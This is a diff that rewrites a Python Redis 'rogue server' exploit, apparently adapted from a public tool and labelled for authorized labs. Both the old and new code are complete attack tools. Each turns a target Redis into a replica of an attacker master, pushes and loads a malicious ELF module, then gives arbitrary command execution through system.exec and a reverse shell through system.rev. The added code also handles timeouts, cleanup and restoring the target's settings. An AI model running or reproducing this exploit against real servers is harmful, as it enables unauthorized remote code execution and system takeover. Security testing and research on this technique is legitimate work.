@@ -1,227 +1,314 @@
 #!/usr/bin/env python3
-import socket
-import sys
-from time import sleep
-from optparse import OptionParser
+"""Redis rogue replication server for authorized, disposable labs.
 
-CLRF = "\r\n"
-SERVER_EXP_MOD_FILE = "exp.so"
-
-BANNER = """______         _ _      ______                         _____                          
-| ___ \       | (_)     | ___ \                       /  ___|                         
-| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
-|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
-| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
-\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
-                                     __/ |                                            
-                                    |___/                                             
-@copyright n0b0dy @ r3kapig
+Derived from n0b0dyCN/redis-rogue-server (Apache-2.0). Changes by Zhaoyi Fan:
+framed RESP, checked replies, listener-first setup, a locally built module,
+unique staging filenames, timeouts, and best-effort configuration restoration.
 """
 
-def encode_cmd_arr(arr):
-    cmd = ""
-    cmd += "*" + str(len(arr))
-    for arg in arr:
-        cmd += CLRF + "$" + str(len(arg))
-        cmd += CLRF + arg
-    cmd += "\r\n"
-    return cmd
+import argparse
+from pathlib import Path
+import secrets
+import socket
+import sys
+import time
 
-def encode_cmd(raw_cmd):
-    return encode_cmd_arr(raw_cmd.split(" "))
 
-def decode_cmd(cmd):
-    if cmd.startswith("*"):
-        raw_arr = cmd.strip().split("\r\n")
-        return raw_arr[2::2]
-    if cmd.startswith("$"):
-        return cmd.split("\r\n", 2)[1]
-    return cmd.strip().split(" ")
+class RedisError(RuntimeError):
+    pass
 
-def info(msg):
-    print(f"\033[1;32;40m[info]\033[0m {msg}")
 
-def error(msg):
-    print(f"\033[1;31;40m[err ]\033[0m {msg}")
+def encode_command(*args):
+    frame = [f"*{len(args)}\r\n".encode("ascii")]
+    for arg in args:
+        data = str(arg).encode("utf-8")
+        frame.extend((b"$" + str(len(data)).encode("ascii") + b"\r\n", data, b"\r\n"))
+    return b"".join(frame)
 
-def din(sock, cnt=4096):
-    global verbose
-    msg = sock.recv(cnt)
-    if verbose:
-        if len(msg) < 1000:
-            print(f"\033[1;34;40m[->]\033[0m {msg}")
-        else:
-            print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
-    return msg.decode('gb18030')
 
-def dout(sock, msg):
-    global verbose
-    if type(msg) != bytes:
-        msg = msg.encode()
-    sock.send(msg)
-    if verbose:
-        if len(msg) < 1000:
-            print(f"\033[1;33;40m[<-]\033[0m {msg}")
-        else:
-            print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")
+def line(reader):
+    data = reader.readline(65537)
+    if not data or len(data) > 65536 or not data.endswith(b"\r\n"):
+        raise RedisError("Incomplete or oversized protocol line")
+    return data[:-2]
 
-def decode_shell_result(s):
-    return "\n".join(s.split("\r\n")[1:-1])
 
-class Remote:
-    def __init__(self, rhost, rport):
-        self._host = rhost
-        self._port = rport
-        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._sock.connect((self._host, self._port))
+def reply(reader):
+    data = line(reader)
+    kind, value = data[:1], data[1:]
+    if kind == b"+":
+        return value.decode("utf-8", "replace")
+    if kind == b"-":
+        raise RedisError(value.decode("utf-8", "replace"))
+    if kind == b":":
+        return int(value)
+    if kind in (b"$", b"*"):
+        size = int(value)
+        if size == -1:
+            return None
+        if size < 0 or size > 16 * 1024 * 1024:
+            raise RedisError("Invalid or excessive reply length")
+        if kind == b"*":
+            return [reply(reader) for _ in range(size)]
+        result = reader.read(size)
+        if len(result) != size or reader.read(2) != b"\r\n":
+            raise RedisError("Truncated bulk reply")
+        return result.decode("utf-8", "replace")
+    raise RedisError(f"Unexpected reply type: {kind!r}")
 
-    def send(self, msg):
-        dout(self._sock, msg)
 
-    def recv(self, cnt=65535):
-        return din(self._sock, cnt)
+class RedisClient:
+    def __init__(self, host, port, password, verbose):
+        self.sock = socket.create_connection((host, port), timeout=15)
+        self.sock.settimeout(15)
+        self.reader = self.sock.makefile("rb")
+        self.verbose = verbose
+        if password is not None:
+            self.command("AUTH", password, hide=True)
 
-    def do(self, cmd):
-        self.send(encode_cmd(cmd))
-        buf = self.recv()
-        return buf
-
-    def shell_cmd(self, cmd):
-        self.send(encode_cmd_arr(['system.exec', f"{cmd}"]))
-        buf = self.recv()
-        return buf
-
-class RogueServer:
-    def __init__(self, lhost, lport):
-        self._host = lhost
-        self._port = lport
-        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._sock.bind(('0.0.0.0', self._port))
-        self._sock.listen(10)
+    def command(self, *args, hide=False):
+        if self.verbose:
+            shown = "[redacted]" if hide else " ".join(map(str, args[1:]))
+            print(f"[redis] {args[0]} {shown}", flush=True)
+        self.sock.sendall(encode_command(*args))
+        result = reply(self.reader)
+        if self.verbose:
+            print(f"[reply] {result!r}", flush=True)
+        return result
 
     def close(self):
-        self._sock.close()
+        self.reader.close()
+        self.sock.close()
 
-    def handle(self, data):
-        cmd_arr = decode_cmd(data)
-        resp = ""
-        phase = 0
-        if cmd_arr[0].startswith("PING"):
-            resp = "+PONG" + CLRF
-            phase = 1
-        elif cmd_arr[0].startswith("REPLCONF"):
-            resp = "+OK" + CLRF
-            phase = 2
-        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
-            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
-            resp += "$" + str(len(payload)) + CLRF
-            resp = resp.encode()
-            resp += payload + CLRF.encode()
-            phase = 3
-        return resp, phase
 
-    def exp(self):
-        cli, addr = self._sock.accept()
-        while True:
-            data = din(cli, 1024)
-            if len(data) == 0:
-                break
-            resp, phase = self.handle(data)
-            dout(cli, resp)
-            if phase == 3:
-                break
+def replication_command(reader):
+    header = line(reader)
+    if not header.startswith(b"*"):
+        return header.decode("ascii", "replace").split()
+    count = int(header[1:])
+    if not 1 <= count <= 16:
+        raise RedisError("Invalid replication command")
+    args = []
+    for _ in range(count):
+        bulk = line(reader)
+        if not bulk.startswith(b"$"):
+            raise RedisError("Invalid replication argument")
+        size = int(bulk[1:])
+        if not 0 <= size <= 4096:
+            raise RedisError("Invalid replication argument length")
+        data = reader.read(size)
+        if len(data) != size or reader.read(2) != b"\r\n":
+            raise RedisError("Truncated replication argument")
+        args.append(data.decode("ascii", "replace"))
+    return args
 
-def interact(remote):
-    info("Interact mode start, enter \"exit\" to quit.")
+
+class RogueMaster:
+    def __init__(self, host, port, payload):
+        self.payload = payload
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            self.sock.bind((host, port))
+            self.sock.listen(1)
+            self.sock.settimeout(30)
+        except Exception:
+            self.sock.close()
+            raise
+
+    def serve(self):
+        print("[info] Waiting for target replica (30 s)", flush=True)
+        connection, _ = self.sock.accept()
+        with connection:
+            connection.settimeout(20)
+            with connection.makefile("rb") as reader:
+                while True:
+                    args = replication_command(reader)
+                    if not args:
+                        raise RedisError("Empty replication command")
+                    verb = args[0].upper()
+                    if verb == "PING":
+                        connection.sendall(b"+PONG\r\n")
+                    elif verb == "REPLCONF":
+                        connection.sendall(b"+OK\r\n")
+                    elif verb in ("PSYNC", "SYNC"):
+                        if verb == "PSYNC":
+                            connection.sendall(b"+FULLRESYNC " + b"Z" * 40 + b" 1\r\n")
+                        connection.sendall(b"$" + str(len(self.payload)).encode("ascii") + b"\r\n")
+                        connection.sendall(self.payload + b"\r\n")
+                        print(f"[info] Sent {len(self.payload)} module bytes", flush=True)
+                        return
+                    else:
+                        raise RedisError(f"Unexpected replication command: {verb}")
+
+    def close(self):
+        self.sock.close()
+
+
+def config(client, name):
+    value = client.command("CONFIG", "GET", name)
+    if not isinstance(value, list) or len(value) != 2 or value[0] != name:
+        raise RedisError(f"Could not read CONFIG GET {name}: {value!r}")
+    return value[1]
+
+
+def checked(client, *args):
+    value = client.command(*args)
+    if value != "OK":
+        raise RedisError(f"{args[0]} {args[1]} returned {value!r}")
+
+
+def interactive(client):
+    print("[info] Each command runs separately; enter 'exit' to return")
+    while True:
+        command = input("[<<] ").strip()
+        if command == "exit":
+            return
+        if command:
+            output = client.command("system.exec", command)
+            print(f"[>>] {output if output else '(no stdout)'}")
+
+
+def reverse(client):
+    host = input("Listener IPv4: ").strip()
+    port = int(input("Listener port: ").strip())
+    socket.inet_pton(socket.AF_INET, host)
+    if not 1 <= port <= 65535:
+        raise ValueError("Listener port must be 1..65535")
+    checked(client, "system.rev", host, str(port))
+    print("[info] Request accepted; verify the connection at your listener")
+
+
+def run(args):
+    path = Path(args.exp).expanduser().resolve()
+    payload = path.read_bytes()
+    if not payload.startswith(b"\x7fELF"):
+        raise ValueError(f"{path} is not an ELF module; run make on Linux")
+    if not args.directory.startswith("/") or args.directory == "/":
+        raise ValueError("--dir must be an absolute writable target directory other than /")
+    client = RedisClient(args.rhost, args.rport, args.passwd, args.verbose)
+    changed = {"dir": False, "dbfilename": False, "replica": False, "module": False}
+    cleanup_errors = []
+    failure = None
+    master = None
+    original_dir = original_filename = None
+    staged = f"rogue-{secrets.token_hex(8)}.so"
     try:
-        while True:
-            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
-            if cmd == "exit":
-                return
-            r = remote.shell_cmd(cmd)
-            for l in decode_shell_result(r).split("\n"):
-                if l:
-                    print("\033[1;34;40m[>>]\033[0m " + l)
+        if client.command("PING") != "PONG":
+            raise RedisError("Target did not reply PONG")
+        original_dir = config(client, "dir")
+        original_filename = config(client, "dbfilename")
+        if "role:master" not in client.command("INFO", "replication"):
+            raise RedisError("Target is already a replica")
+        modules = client.command("MODULE", "LIST")
+        if any(isinstance(item, list) and "system" in item for item in modules):
+            raise RedisError("The system module is already loaded")
+        print(f"[info] Original dir={original_dir}, dbfilename={original_filename}")
+
+        master = RogueMaster(args.lhost, args.lport, payload)
+        print(f"[info] Listening at {args.lhost}:{args.lport}")
+        if args.directory != original_dir:
+            changed["dir"] = True
+            checked(client, "CONFIG", "SET", "dir", args.directory)
+        changed["dbfilename"] = True
+        checked(client, "CONFIG", "SET", "dbfilename", staged)
+        changed["replica"] = True
+        checked(client, "SLAVEOF", args.lhost, str(args.lport))
+        master.serve()
+        master.close()
+        master = None
+
+        last_error = None
+        for attempt in range(6):
+            try:
+                checked(client, "MODULE", "LOAD", f"./{staged}")
+                changed["module"] = True
+                print("[info] MODULE LOAD: OK")
+                break
+            except RedisError as exc:
+                last_error = exc
+                if attempt < 5:
+                    time.sleep(1)
+        if not changed["module"]:
+            raise RedisError(f"MODULE LOAD failed after replication: {last_error}")
+
+        checked(client, "SLAVEOF", "NO", "ONE")
+        changed["replica"] = False
+        checked(client, "CONFIG", "SET", "dbfilename", original_filename)
+        changed["dbfilename"] = False
+        removed = client.command("system.exec",
+                                 f"rm -f -- ./{staged} && test ! -e ./{staged} && printf removed")
+        if removed != "removed":
+            raise RedisError("Could not verify staged module removal")
+        if changed["dir"]:
+            checked(client, "CONFIG", "SET", "dir", original_dir)
+            changed["dir"] = False
+
+        if args.command is not None:
+            print(client.command("system.exec", args.command))
+        else:
+            while True:
+                choice = input("[i] commands, [r] reverse shell, [q] quit: ").strip().lower()
+                if choice == "i":
+                    interactive(client)
+                elif choice == "r":
+                    reverse(client)
+                elif choice == "q":
+                    break
+                else:
+                    print("[info] Choose i, r, or q")
+    except BaseException as exc:
+        failure = exc
+    finally:
+        if master is not None:
+            master.close()
+        for active, label, command in (
+            (changed["module"], "MODULE UNLOAD", ("MODULE", "UNLOAD", "system")),
+            (changed["replica"], "SLAVEOF NO ONE", ("SLAVEOF", "NO", "ONE")),
+            (changed["dbfilename"] and original_filename is not None,
+             "restore dbfilename", ("CONFIG", "SET", "dbfilename", original_filename)),
+            (changed["dir"] and original_dir is not None,
+             "restore dir", ("CONFIG", "SET", "dir", original_dir)),
+        ):
+            if active:
+                try:
+                    checked(client, *command)
+                    print(f"[info] {label}: OK")
+                except Exception as exc:
+                    cleanup_errors.append(f"{label}: {exc}")
+        client.close()
+    if cleanup_errors:
+        print("[warn] Cleanup incomplete: " + "; ".join(cleanup_errors), file=sys.stderr)
+    if failure is not None:
+        raise failure
+    if cleanup_errors:
+        raise RedisError("Cleanup incomplete; inspect ROLE, CONFIG GET and MODULE LIST")
+
+
+def main():
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("--rhost", required=True, help="owned lab Redis host")
+    parser.add_argument("--rport", type=int, default=6379, help="target Redis port")
+    parser.add_argument("--lhost", required=True, help="local IPv4 reachable by target")
+    parser.add_argument("--lport", type=int, default=6379, help="rogue master port")
+    parser.add_argument("--exp", default=str(Path(__file__).with_name("module.so")),
+                        help="locally built ELF module (default: ./module.so)")
+    parser.add_argument("--dir", dest="directory", default="/tmp",
+                        help="writable target directory (default: /tmp)")
+    parser.add_argument("--passwd", help="target Redis password, if configured")
+    parser.add_argument("--command", help="run one command and exit")
+    parser.add_argument("-v", "--verbose", action="store_true", help="show Redis replies")
+    args = parser.parse_args()
+    try:
+        run(args)
     except KeyboardInterrupt:
-        pass
+        print("\n[info] Interrupted", file=sys.stderr)
+        return 130
+    except (OSError, RedisError, ValueError) as exc:
+        print(f"[error] {exc}", file=sys.stderr)
+        return 1
+    return 0
 
-def reverse(remote):
-    info("Open reverse shell...")
-    addr = input("Reverse server address: ")
-    port = input("Reverse server port: ")
-    dout(remote, encode_cmd(f"system.rev {addr} {port}"))
-    info("Reverse shell payload sent.")
-    info(f"Check at {addr}:{port}")
 
-def cleanup(remote):
-    info("Unload module...")
-    remote.do("MODULE UNLOAD system")
-
-def runserver(rhost, rport, lhost, lport, passwd):
-    # expolit
-    remote = Remote(rhost, rport)
-    info("Setting master...")
-    # auth 
-    if passwd:
-    	info("Authenticating...")
-    	remote.do(f"AUTH {passwd}")
-    remote.do(f"SLAVEOF {lhost} {lport}")
-    info("Setting dbfilename...")
-    remote.do(f"CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}")
-    sleep(2)
-    rogue = RogueServer(lhost, lport)
-    rogue.exp()
-    sleep(2)
-    info("Loading module...")
-    remote.do(f"MODULE LOAD ./{SERVER_EXP_MOD_FILE}")
-    info("Temerory cleaning up...")
-    remote.do("SLAVEOF NO ONE")
-    remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd(f"rm ./{SERVER_EXP_MOD_FILE}")
-    rogue.close()
-
-    # Operations here
-    choice = input("What do u want, [i]nteractive shell or [r]everse shell: ")
-    if choice.startswith("i"):
-        interact(remote)
-    elif choice.startswith("r"):
-        reverse(remote)
-
-    cleanup(remote)
-
-if __name__ == '__main__':
-    print(BANNER)
-    parser = OptionParser()
-    parser.add_option("--rhost", dest="rh", type="string",
-            help="target host", metavar="REMOTE_HOST")
-    parser.add_option("--rport", dest="rp", type="int",
-            help="target redis port, default 6379", default=6379,
-            metavar="REMOTE_PORT")
-    parser.add_option("--lhost", dest="lh", type="string",
-            help="rogue server ip", metavar="LOCAL_HOST")
-    parser.add_option("--lport", dest="lp", type="int",
-            help="rogue server listen port, default 21000", default=21000,
-            metavar="LOCAL_PORT")
-    parser.add_option("--exp", dest="exp", type="string",
-            help="Redis Module to load, default exp.so", default="exp.so",
-            metavar="EXP_FILE")
-    parser.add_option("-v", "--verbose", action="store_true", default=False,
-            help="Show full data stream")
-    parser.add_option("--passwd", dest="rpasswd", type="string",
-            help="target redis password")
-
-    (options, args) = parser.parse_args()
-    global verbose, payload, exp_mod
-    verbose = options.verbose
-    exp_mod = options.exp
-    payload = open(exp_mod, "rb").read()
-
-    if not options.rh or not options.lh:
-        parser.error("Invalid arguments")
-
-    info(f"TARGET {options.rh}:{options.rp}")
-    info(f"SERVER {options.lh}:{options.lp}")
-    try:
-        runserver(options.rh, options.rp, options.lh, options.lp, options.rpasswd)
-    except Exception as e:
-        error(repr(e))
+if __name__ == "__main__":
+    sys.exit(main())
